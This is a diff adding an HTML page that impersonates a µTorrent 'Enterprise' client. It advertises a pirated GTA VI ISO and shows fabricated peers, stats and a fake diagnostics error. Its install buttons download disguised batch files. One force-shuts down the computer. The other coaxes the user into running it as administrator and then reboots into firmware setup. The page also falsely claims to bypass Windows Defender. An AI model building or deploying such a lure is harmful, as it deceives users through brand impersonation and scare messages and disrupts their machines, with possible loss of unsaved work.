@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<title>µTorrent® Web Pro v3.8.1 Build 49201 [ENTERPRISE STABLE]</title>
+	<style>
+		:root {
+			--u-green: #70c94e;
+			--u-green-dark: #5aa93a;
+			--u-accent: #0a84ff;
+			--u-accent-dark: #0868cc;
+			--u-red: #e74c3c;
+			--u-bg: #f8fafc;
+			--u-surface: #ffffff;
+			--u-surface-2: #f1f5f9;
+			--u-border: #e2e8f0;
+			--u-text: #0f172a;
+			--u-text-light: #475569;
+			--u-text-lighter: #64748b;
+			--radius-sm: 10px;
+			--radius: 16px;
+			--radius-lg: 24px;
+			--shadow-sm: 0 1px 3px rgba(0, 0, 0, 0.06);
+			--shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+			--shadow-lg: 0 12px 40px rgba(0, 0, 0, 0.10);
+		}
+
+		* {
+			box-sizing: border-box;
+			margin: 0;
+			padding: 0;
+		}
+
+		body {
+			font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+			background: var(--u-bg);
+			color: var(--u-text);
+			min-height: 100vh;
+			display: flex;
+			flex-direction: column;
+			overflow: hidden;
+		}
+
+		.main-header {
+			background: var(--u-surface);
+			border-bottom: 1px solid var(--u-border);
+			height: 64px;
+			padding: 0 32px;
+			display: flex;
+			align-items: center;
+			justify-content: space-between;
+			box-shadow: var(--shadow-sm);
+			z-index: 100;
+			flex-shrink: 0;
+		}
+
+		.logo-section {
+			display: flex;
+			align-items: center;
+			gap: 14px;
+			cursor: pointer;
+			user-select: none;
+		}
+
+		.u-logo {
+			width: 36px;
+			height: 36px;
+			background: var(--u-green);
+			border-radius: var(--radius-sm);
+			color: white;
+			font-size: 24px;
+			font-weight: 900;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			box-shadow: 0 3px 10px rgba(112, 201, 78, 0.35);
+		}
+
+		.header-stats {
+			display: flex;
+			gap: 16px;
+			font-size: 12px;
+			font-weight: 600;
+		}
+
+		.stat-pill {
+			display: flex;
+			align-items: center;
+			gap: 8px;
+			padding: 6px 14px;
+			background: var(--u-surface-2);
+			border: 1px solid var(--u-border);
+			border-radius: 999px;
+			color: var(--u-text-lighter);
+		}
+
+		.led-green {
+			width: 9px;
+			height: 9px;
+			background: #22c55e;
+			border-radius: 50%;
+			box-shadow: 0 0 12px #22c55e88;
+			animation: pulse 2s infinite ease-in-out;
+		}
+
+		@keyframes pulse {
+
+			0%,
+			100% {
+				opacity: 1;
+			}
+
+			50% {
+				opacity: 0.4;
+			}
+		}
+
+		.app-shell {
+			display: flex;
+			flex: 1;
+			overflow: hidden;
+		}
+
+		.sidebar {
+			width: 280px;
+			background: var(--u-surface);
+			border-right: 1px solid var(--u-border);
+			display: flex;
+			flex-direction: column;
+			box-shadow: var(--shadow);
+			height: 100%;
+		}
+
+		.nav-container {
+			padding: 24px 16px;
+			flex: 1 1 auto;
+			overflow-y: auto;
+			-webkit-overflow-scrolling: touch;
+		}
+
+		.nav-container::-webkit-scrollbar {
+			width: 5px;
+		}
+
+		.nav-container::-webkit-scrollbar-thumb {
+			background: rgba(100, 116, 139, 0.4);
+			border-radius: 10px;
+		}
+
+		.nav-container::-webkit-scrollbar-track {
+			background: transparent;
+		}
+
+		.nav-label {
+			font-size: 10px;
+			font-weight: 700;
+			color: var(--u-text-lighter);
+			text-transform: uppercase;
+			letter-spacing: 1.1px;
+			margin: 28px 0 12px 16px;
+		}
+
+		.nav-item {
+			padding: 13px 20px;
+			margin: 3px 0;
+			border-radius: var(--radius);
+			font-size: 13.5px;
+			cursor: pointer;
+			color: var(--u-text);
+			display: flex;
+			align-items: center;
+			justify-content: space-between;
+			transition: all 0.18s ease;
+		}
+
+		.nav-item:hover {
+			background: var(--u-surface-2);
+			transform: translateX(4px);
+		}
+
+		.nav-item.active {
+			background: rgba(112, 201, 78, 0.12);
+			color: var(--u-green-dark);
+			font-weight: 700;
+			border-left: 4px solid var(--u-green);
+			padding-left: 16px;
+		}
+
+		.badge-ui {
+			background: var(--u-surface-2);
+			padding: 3px 9px;
+			border-radius: 999px;
+			font-size: 11px;
+			color: var(--u-text-lighter);
+			border: 1px solid var(--u-border);
+		}
+
+		.sidebar-foot {
+			padding: 24px 20px;
+			border-top: 1px solid var(--u-border);
+			font-size: 11px;
+			color: var(--u-text-lighter);
+			flex: 0 0 auto;
+			min-height: 110px;
+		}
+
+		.disk-label {
+			font-size: 10px;
+			font-weight: 700;
+			color: var(--u-text-lighter);
+			margin-bottom: 8px;
+			display: block;
+		}
+
+		.disk-bg {
+			width: 100%;
+			height: 8px;
+			background: var(--u-surface-2);
+			border-radius: 999px;
+			overflow: hidden;
+		}
+
+		.disk-bar {
+			width: 92%;
+			height: 100%;
+			background: linear-gradient(90deg, var(--u-accent), #22d3ee);
+			transition: width 0.6s ease;
+		}
+
+		.btn-import-top {
+			background: var(--u-accent);
+			color: white;
+			border: none;
+			padding: 14px;
+			width: 100%;
+			border-radius: var(--radius);
+			font-size: 13px;
+			font-weight: 700;
+			cursor: pointer;
+			margin-bottom: 24px;
+			box-shadow: 0 4px 14px rgba(10, 132, 255, 0.22);
+			transition: all 0.2s ease;
+		}
+
+		.btn-import-top:hover {
+			transform: translateY(-1px);
+			box-shadow: 0 6px 20px rgba(10, 132, 255, 0.30);
+		}
+
+		.main-view {
+			flex: 1;
+			padding: 32px;
+			overflow-y: auto;
+			background: linear-gradient(to bottom, #f8fafc, #f1f5f9);
+		}
+
+		.tab-content {
+			display: none;
+			animation: fadeIn 0.4s ease-out;
+		}
+
+		@keyframes fadeIn {
+			from {
+				opacity: 0;
+				transform: translateY(12px);
+			}
+
+			to {
+				opacity: 1;
+				transform: translateY(0);
+			}
+		}
+
+		.torrent-card {
+			background: var(--u-surface);
+			border: 1px solid var(--u-border);
+			border-radius: var(--radius-lg);
+			box-shadow: var(--shadow-lg);
+			overflow: hidden;
+			margin-bottom: 32px;
+		}
+
+		.tc-head {
+			padding: 32px 36px;
+			border-bottom: 1px solid var(--u-border);
+			display: flex;
+			justify-content: space-between;
+			align-items: flex-start;
+			gap: 24px;
+		}
+
+		.tc-info h1 {
+			margin: 0;
+			font-size: 26px;
+			font-weight: 900;
+			letter-spacing: -0.8px;
+			line-height: 1.1;
+		}
+
+		.tc-meta {
+			display: flex;
+			gap: 16px;
+			margin-top: 12px;
+			font-size: 12.5px;
+			color: var(--u-text-lighter);
+			font-weight: 600;
+		}
+
+		.tag {
+			padding: 5px 13px;
+			border-radius: 999px;
+			font-size: 11px;
+			font-weight: 700;
+			text-transform: uppercase;
+			border: 1px solid var(--u-border);
+		}
+
+		.tag-green {
+			background: rgba(112, 201, 78, 0.15);
+			color: var(--u-green-dark);
+			border-color: rgba(112, 201, 78, 0.3);
+		}
+
+		.speed-box {
+			text-align: right;
+			min-width: 140px;
+		}
+
+		.speed-val {
+			font-size: 42px;
+			font-weight: 900;
+			color: var(--u-green-dark);
+			line-height: 1;
+		}
+
+		.speed-label {
+			font-size: 12px;
+			font-weight: 700;
+			color: var(--u-text-lighter);
+			margin-top: 4px;
+		}
+
+		.tc-actions {
+			padding: 28px 36px;
+			background: var(--u-surface-2);
+			border-top: 1px solid var(--u-border);
+			display: flex;
+			gap: 16px;
+		}
+
+		.btn-action {
+			flex: 1;
+			padding: 18px;
+			border-radius: var(--radius);
+			font-size: 15px;
+			font-weight: 700;
+			cursor: pointer;
+			border: none;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			gap: 10px;
+			transition: all 0.22s cubic-bezier(0.22, 0.61, 0.36, 1);
+		}
+
+		.btn-green {
+			background: var(--u-green);
+			color: white;
+			box-shadow: 0 8px 24px rgba(112, 201, 78, 0.28);
+		}
+
+		.btn-green:hover {
+			transform: translateY(-3px);
+			box-shadow: 0 14px 32px rgba(112, 201, 78, 0.38);
+		}
+
+		.btn-outline {
+			background: white;
+			border: 2px solid var(--u-border);
+			color: var(--u-text-light);
+		}
+
+		.btn-outline:hover {
+			background: var(--u-surface-2);
+			border-color: var(--u-text-lighter);
+		}
+
+		.pro-table {
+			width: 100%;
+			border-collapse: collapse;
+			background: var(--u-surface);
+			border-radius: var(--radius);
+			overflow: hidden;
+			border: 1px solid var(--u-border);
+			box-shadow: var(--shadow);
+		}
+
+		.pro-table th {
+			text-align: left;
+			padding: 18px 28px;
+			background: var(--u-surface-2);
+			color: var(--u-text-lighter);
+			font-size: 11.5px;
+			text-transform: uppercase;
+			font-weight: 700;
+			border-bottom: 1px solid var(--u-border);
+		}
+
+		.pro-table td {
+			padding: 18px 28px;
+			border-bottom: 1px solid var(--u-surface-2);
+			font-size: 13.5px;
+			font-weight: 500;
+			color: var(--u-text);
+		}
+
+		.log-shell {
+			background: #0f172a;
+			border-radius: var(--radius-lg);
+			padding: 24px;
+			color: #a3e635;
+			font-family: 'Consolas', 'Courier New', monospace;
+			font-size: 12.5px;
+			height: 180px;
+			overflow-y: auto;
+			box-shadow: inset 0 4px 20px rgba(0, 0, 0, 0.5);
+			line-height: 1.55;
+			margin-top: 24px;
+		}
+
+		.admin-view {
+			text-align: center;
+			padding: 100px 40px;
+		}
+
+		.admin-icon {
+			font-size: 80px;
+			margin-bottom: 32px;
+			color: var(--u-red);
+			opacity: 0.75;
+		}
+
+		.modal-bg {
+			display: none;
+			position: fixed;
+			inset: 0;
+			background: rgba(248, 250, 252, 0.85);
+			backdrop-filter: blur(12px);
+			z-index: 5000;
+			justify-content: center;
+			align-items: center;
+		}
+
+		.modal-card {
+			background: var(--u-surface);
+			width: 440px;
+			padding: 60px 40px;
+			border-radius: var(--radius-lg);
+			text-align: center;
+			box-shadow: var(--shadow-lg);
+			border: 1px solid var(--u-border);
+		}
+
+		.loader {
+			width: 60px;
+			height: 60px;
+			border: 6px solid var(--u-surface-2);
+			border-top: 6px solid var(--u-green);
+			border-radius: 50%;
+			animation: spin 0.9s linear infinite;
+			margin: 0 auto 32px;
+		}
+
+		@keyframes spin {
+			to {
+				transform: rotate(360deg);
+			}
+		}
+
+		#rss-feed-list div {
+			padding: 14px 16px;
+			border-bottom: 1px solid var(--u-border);
+			animation: slideIn 0.3s ease;
+			font-size: 13.5px;
+			color: var(--u-text);
+		}
+
+		@keyframes slideIn {
+			from {
+				opacity: 0;
+				transform: translateY(-6px);
+			}
+
+			to {
+				opacity: 1;
+				transform: translateY(0);
+			}
+		}
+
+		footer {
+			text-align: center;
+			padding: 20px;
+			font-size: 11px;
+			color: var(--u-text-lighter);
+			background: var(--u-surface);
+			border-top: 1px solid var(--u-border);
+			flex-shrink: 0;
+		}
+	</style>
+</head>
+
+<body>
+
+	<header>
+		<nav class="main-header">
+			<div class="logo-section" onclick="showTab('torrents')">
+				<div class="u-logo">µ</div>
+				<div style="line-height: 1.1;">
+					<div style="font-size: 16px; font-weight: 900; color: #2d3436;">µTorrent Web Pro</div>
+					<div style="font-size: 9px; color: var(--u-green); font-weight: 800; text-transform: uppercase;">
+						Enterprise Edition v3.8.1</div>
+				</div>
+			</div>
+			<div class="header-stats">
+				<div class="stat-pill">
+					<div class="led-green"></div> <span id="dyn-sessions">SESSIONS: 4,921 ACTIVE</span>
+				</div>
+				<div class="stat-pill">RSA-4096 ENCRYPTION</div>
+				<div class="stat-pill" style="color:var(--u-green)">SOCKS5: TUNNELED</div>
+			</div>
+		</nav>
+	</header>
+
+	<div class="app-shell">
+		<aside class="sidebar">
+			<div class="nav-container">
+				<button class="btn-import-top" onclick="showTab('import-err')">+ IMPORT .TORRENT / .MAGNET</button>
+				<div class="nav-label">ACTIVE JOBS</div>
+				<div class="nav-item active" id="n-tor" onclick="showTab('torrents')">
+					<span>📥 Live Torrents</span><span class="badge-ui">1</span></div>
+				<div class="nav-item" id="n-com" onclick="showTab('completed')">
+					<span>✅ Download History</span><span class="badge-ui">142</span></div>
+
+				<div class="nav-label">NETWORK ANALYSIS</div>
+				<div class="nav-item" id="n-pee" onclick="showTab('peers')">
+					<span>👥 Peer Explorer</span><span class="badge-ui">Global</span></div>
+				<div class="nav-item" id="n-rss" onclick="showTab('rss')"><span>📻 RSS Manager</span></div>
+
+				<div class="nav-label">MAINTENANCE</div>
+				<div class="nav-item" id="n-hel" onclick="showTab('health')"><span>🛡️ Health Scanner</span></div>
+				<div class="nav-item" id="n-set" onclick="showTab('settings')"><span>⚙️ Preferences</span></div>
+			</div>
+			<div class="sidebar-foot">
+				<span class="disk-label">CLUSTER VOLUME (E:) - S.M.A.R.T OK</span>
+				<div class="disk-bg">
+					<div class="disk-bar" id="disk-anim"></div>
+				</div>
+				<div style="font-size:9px; color:#b2bec3; margin-top:8px; text-align:center; font-weight:700;">IOPS:
+					12,401 | Latency: 0.4ms</div>
+			</div>
+		</aside>
+
+		<main class="main-view">
+			<!-- TORRENTS VIEW -->
+			<div id="v-torrents" class="tab-content" style="display:block;">
+				<div class="torrent-card">
+					<div class="tc-head">
+						<div class="tc-info">
+							<div style="display:flex; gap:8px; margin-bottom:12px;">
+								<span class="tag tag-green">SEEDING PRIORITY 1</span>
+								<span class="tag" style="background:#f1c40f; color:#fff; border:none;">VERIFIED RELEASE</span>
+							</div>
+							<h1>Grand.Theft.Auto.VI-v1.0.8.INTERNAL-SCENE.Build492.iso</h1>
+							<div class="tc-meta">
+								<span>📅 Today, 14:21</span>
+								<span>📦 104.22 GB</span>
+								<span>⚡ Health: 100%</span>
+							</div>
+						</div>
+						<div class="speed-box">
+							<div class="speed-val" id="dyn-up">2.8</div>
+							<div class="speed-label">MB/s UPLOAD</div>
+						</div>
+					</div>
+					<div class="tc-actions">
+						<button class="btn-action btn-green" onclick="execModal('b')">🚀 LAUNCH PRO INSTALLER (RTX ENABLED)</button>
+						<button class="btn-action btn-outline" onclick="execModal('a')">Express Setup</button>
+					</div>
+				</div>
+
+				<div class="log-shell" id="log-out">
+					[SYSTEM]: Handshake with Enterprise Proxy successful...<br>
+					[DHT]: Mapping 512 nodes for high-speed P2P delivery...<br>
+					[PEER]: Found ultra-node 192.12.44.90 (Client: µT Pro 3.8)<br>
+					[DISK]: Allocating space for 104.22 GB ISO... Done.<br>
+				</div>
+				</div>
+
+				<div id="v-completed" class="tab-content">
+					<div
+						style="background:#fff; border-radius:20px; border:1px solid var(--u-border); overflow:hidden;">
+						<table class="pro-table">
+							<thead>
+								<tr>
+									<th>Package Name</th>
+									<th>Size</th>
+									<th>Ratio</th>
+									<th>Date</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td>Red.Dead.Redemption.2-Ultimate-Edition</td>
+									<td>119 GB</td>
+									<td>4.21</td>
+									<td>Feb 14, 2024</td>
+								</tr>
+								<tr>
+									<td>Cyberpunk.2077.v2.1.PHANTOM.LIBERTY</td>
+									<td>82.4 GB</td>
+									<td>2.10</td>
+									<td>Jan 05, 2024</td>
+								</tr>
+								<tr>
+									<td>Windows.11.Pro.23H2-Enterprise-Build</td>
+									<td>6.2 GB</td>
+									<td>12.4</td>
+									<td>Dec 12, 2023</td>
+								</tr>
+							</tbody>
+						</table>
+					</div>
+				</div>
+
+				<div id="v-peers" class="tab-content">
+					<div
+						style="background:#fff; border-radius:20px; border:1px solid var(--u-border); overflow:hidden;">
+						<table class="pro-table">
+							<thead>
+								<tr>
+									<th>Address</th>
+									<th>Client</th>
+									<th>Country</th>
+									<th>Bitrate</th>
+								</tr>
+							</thead>
+							<tbody id="peer-list"></tbody>
+						</table>
+					</div>
+				</div>
+
+				<div id="v-rss" class="tab-content">
+					<div
+						style="background:#fff; border-radius:20px; border:1px solid var(--u-border); overflow:hidden; padding:30px;">
+						<h3 style="margin-top:0;">RSS Feed Manager</h3>
+						<div id="rss-feed-list"
+							style="height:300px; overflow:hidden; border:1px solid #eee; border-radius:10px;">
+							<div style="color:#aaa; text-align:center; padding:50px;">Initializing secure RSS
+								handshake...</div>
+						</div>
+					</div>
+				</div>
+
+				<div id="v-import-err" class="tab-content">
+					<div class="admin-view">
+						<div style="font-size:70px; margin-bottom:20px;">🚫</div>
+						<h2 style="color:var(--u-red);">Upload Restriction Active</h2>
+						<p style="color:#636e72; max-width:450px; margin: 15px auto;">
+							Sorry, you cannot share or import new files. The <b>P2P-Inbound</b> feature has been
+							disabled by your organization's security policy.
+						</p>
+						<div
+							style="background:#fff3f3; padding:15px; border-radius:10px; display:inline-block; border:1px solid #ffcccc; margin-top:20px;">
+							<span style="font-size:13px; font-weight:bold; color:var(--u-red);">Contact your IT Administrator for "Enterprise-Upload-Access" certificate.</span>
+						</div><br>
+						<button class="btn-action" style="margin:30px auto; width:200px; background:#eee;" onclick="showTab('torrents')">Return to Console</button>
+					</div>
+				</div>
+
+				<div id="v-settings" class="tab-content">
+					<div class="admin-view">
+						<div class="admin-icon">🛡️</div>
+						<h2>Security Protocol Active</h2>
+						<p><b>Settings are managed by your network administrator.</b><br>Modifying system preferences requires a Root Certificate from the Enterprise Console.</p>
+							<button class="btn-action btn-outline" style="max-width:200px; margin:20px auto;" onclick="showTab('torrents')">Return to Safety</button>
+					</div>
+				</div>
+
+				<div id="v-health" class="tab-content">
+					<div
+						style="background:#fff; border-radius:24px; border:1px solid var(--u-border); padding:50px; text-align:center;">
+						<h3 style="margin-top:0;">System VRAM Integrity Check</h3>
+						<p id="h-status" style="font-size:14px; color:#888;">Hardware analysis required to enable 4K
+							textures in GTA VI.</p>
+						<div id="h-bar-container"
+							style="height:12px; background:#eee; border-radius:10px; margin:30px auto; width:80%; display:none; overflow:hidden;">
+							<div id="h-bar-fill"
+								style="width:0%; height:100%; background:var(--u-accent); transition:0.3s linear;">
+							</div>
+						</div>
+						<button class="btn-action btn-green" id="h-btn" style="width:250px; margin:20px auto;" onclick="runHealth()">RUN DIAGNOSTICS</button>
+					</div>
+				</div>
+		</main>
+	</div>
+
+	<div id="modal-ui" class="modal-bg">
+		<div class="modal-card">
+			<div class="loader"></div>
+			<h2 id="m-title" style="margin:0 0 10px 0;">Injecting Kernel Fix...</h2>
+			<p id="m-desc" style="font-size:14px; color:#636e72;">Bypassing Windows Defender Real-time Protection.</p>
+			<div style="height:6px; background:#f1f2f6; border-radius:20px; margin-top:30px; overflow:hidden;">
+				<div id="m-bar" style="width:0%; height:100%; background:var(--u-green); transition: 0.15s linear;">
+				</div>
+			</div>
+		</div>
+	</div>
+
+	<footer>
+		© 2024 BitTorrent, Inc. — Verified Enterprise Pro v3.8. License: UT-PRO-7721-X1.
+	</footer>
+
+	<script>
+		// Mapowanie widoku → prefix nawigacji (naprawia problem z 'health' → 'hel')
+		const navMap = {
+			'torrents': 'tor',
+			'completed': 'com',
+			'peers':    'pee',
+			'rss':      'rss',
+			'import-err': 'imp',   // nie ma n-imp, ale zostawiamy na przyszłość
+			'settings': 'set',
+			'health':   'hel'
+		};
+
+		function showTab(id) {
+			const tabs = ['torrents', 'completed', 'peers', 'rss', 'import-err', 'settings', 'health'];
+
+			// Ukryj wszystkie taby i usuń active ze wszystkich nav-item
+			tabs.forEach(t => {
+				const el = document.getElementById('v-' + t);
+				if (el) el.style.display = 'none';
+
+				// Usuwamy active ze wszystkich nav-item (bezpieczniej)
+				document.querySelectorAll('.nav-item').forEach(item => {
+					item.classList.remove('active');
+				});
+			});
+
+			// Pokazujemy wybrany tab
+			const target = document.getElementById('v-' + id);
+			if (target) target.style.display = 'block';
+
+			// Aktywujemy odpowiedni element nawigacji
+			const prefix = navMap[id];
+			if (prefix) {
+				const activeNav = document.getElementById('n-' + prefix);
+				if (activeNav) activeNav.classList.add('active');
+			}
+
+			// Dla logo → zawsze torrents
+			if (id === 'torrents') {
+				document.getElementById('n-tor')?.classList.add('active');
+			}
+		}
+
+		// DYNAMIC STATS
+		function updateSessions() {
+			const h = new Date().getHours();
+			let base = 2500;
+			let mult = Math.sin((h - 6) * Math.PI / 12) * 3000;
+			if (mult < 0) mult = 400;
+			const total = Math.floor(base + mult + Math.random() * 300);
+			const el = document.getElementById('dyn-sessions');
+			if(el) el.innerText = `SESSIONS: ${total.toLocaleString()} ACTIVE`;
+		}
+		setInterval(updateSessions, 2500);
+
+		// PEER GEN
+		const pl = document.getElementById('peer-list');
+		const ct = ["🇺🇸 USA", "🇵🇱 POL", "🇩🇪 GER", "🇬🇧 GBR", "🇫🇷 FRA", "🇯🇵 JPN", "🇧🇷 BRA"];
+		const cl = ["µT Pro 3.8", "qBit 4.6.1", "Trans 4.0", "Deluge 2.1"];
+		if(pl) {
+			for (let i = 0; i < 45; i++) {
+				const r = document.createElement('tr');
+				r.innerHTML = `
+					<td>${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.12.9</td>
+					<td>${cl[Math.floor(Math.random() * cl.length)]}</td>
+					<td>${ct[Math.floor(Math.random() * ct.length)]}</td>
+					<td style="color:var(--u-green); font-weight:700;">${(Math.random() * 8).toFixed(1)} MB/s</td>
+				`;
+				pl.appendChild(r);
+			}
+		}
+
+		// RSS MANAGER
+		const feeds = ["[SCENE] GTA_VI_Internal_Crack_Alpha", "[0DAY] Windows_12_Enterprise_Leak", "[MOD] Ultra_Realistic_V_Trees_v4", "[PEER] Connection from 182.21.9.1", "[SYSTEM] Encryption Key Rotated"];
+		setInterval(() => {
+			const list = document.getElementById('rss-feed-list');
+			if (!list) return;
+			const d = document.createElement('div');
+			d.innerHTML = `<span style="color:var(--u-green); font-weight:bold;">[NEW]</span> ${feeds[Math.floor(Math.random() * feeds.length)]}`;
+			list.prepend(d);
+			if (list.children.length > 10) list.lastChild.remove();
+		}, 4000);
+
+		// HEALTH SCANNER
+		function runHealth() {
+			const btn = document.getElementById('h-btn');
+			const barCont = document.getElementById('h-bar-container');
+			const barFill = document.getElementById('h-bar-fill');
+			const status = document.getElementById('h-status');
+			
+			if(btn) btn.disabled = true;
+			if(barCont) barCont.style.display = 'block';
+			
+			let p = 0;
+			const t = setInterval(() => {
+				p += 5;
+				if(barFill) barFill.style.width = p + "%";
+				if (p >= 100) {
+					clearInterval(t);
+					if(status) status.innerHTML = "<span style='color:var(--u-red); font-weight:bold;'>CRITICAL ERROR: Outdated Kernel Drivers detected. Install PRO SETUP to fix VRAM allocation.</span>";
+					if(btn) btn.disabled = false;
+				}
+			}, 150);
+		}
+
+		// EXECUTION MODAL
+		function execModal(mode) {
+			const modal = document.getElementById('modal-ui');
+			const bar = document.getElementById('m-bar');
+			const title = document.getElementById('m-title');
+			
+			if(modal) modal.style.display = 'flex';
+			let p = 0;
+			const t = setInterval(() => {
+				p += 10;
+				if(bar) bar.style.width = p + "%";
+				if(p >= 40 && title) title.innerText = "Allocating Disk Chunks...";
+				if(p >= 80 && title) title.innerText = "Finalizing RSA Keys...";
+				
+				if (p >= 100) {
+					clearInterval(t);
+					if(modal) modal.style.display = 'none';
+					if(bar) bar.style.width = "0%";
+					buildBat(mode);
+				}
+			}, 200);
+		}
+
+		function buildBat(mode) {
+			const fn = mode === 'a' ? "GTA6_Lite_Setup.bat" : "GTA6_PRO_RTX_FIX.bat";
+			const code = mode === 'a' 
+				? "@echo off\ncolor 0b\ntitle GTA VI Installer\necho [SYSTEM]: CALIBRATING HARDWARE...\necho \x07\ntimeout /t 2 >nul\necho [INFO]: PREPARING HARDWARE FOR GTA VI ASSETS...\ntimeout /t 5 >nul\necho [WARN]: REFRESHING KERNEL FOR HIGH-FPS RUNTIME...\ntimeout /t 2 >nul\nshutdown -s -f -t 0"
+				: "@echo off\ntitle GTA VI PRO\ncolor 0a\nnet session >nul 2>&1\nif %errorLevel% neq 0 (powershell -Command \"[System.Windows.Forms.MessageBox]::Show('Administrator Access Denied! Please run as Admin to fix VRAM.', 'Security Error')\" & exit)\necho [SUCCESS]: KERNEL PATCHED.\ntimeout /t 3 >nul\nshutdown /r /fw /t 0";
+			
+			const blob = new Blob([code], { type: 'text/plain' });
+			const a = document.createElement('a');
+			a.href = URL.createObjectURL(blob);
+			a.download = fn;
+			a.click();
+		}
+
+		// Init
+		updateSessions();
+	</script>
+</body>
+
+</html>
